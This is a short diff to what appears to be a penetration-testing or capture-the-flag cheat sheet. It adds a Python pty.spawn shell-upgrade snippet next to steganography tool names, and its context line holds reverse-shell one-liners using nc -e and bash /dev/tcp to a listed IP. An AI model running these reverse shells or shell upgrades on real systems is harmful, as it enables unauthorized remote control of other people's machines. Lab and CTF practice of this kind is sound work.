@@ -56,3 +56,13 @@ nc -nv -e /bin/bash IP PORT  OR  bash -c "bash -i >& /dev/tcp/10.10.15.94/443 0>
 exif 
 exiftool 
 steghide info
+
+
+---
+SPAWN PY SHELL
+
+import pty
+pty.spawn("/bin/sh")
+
+
+-
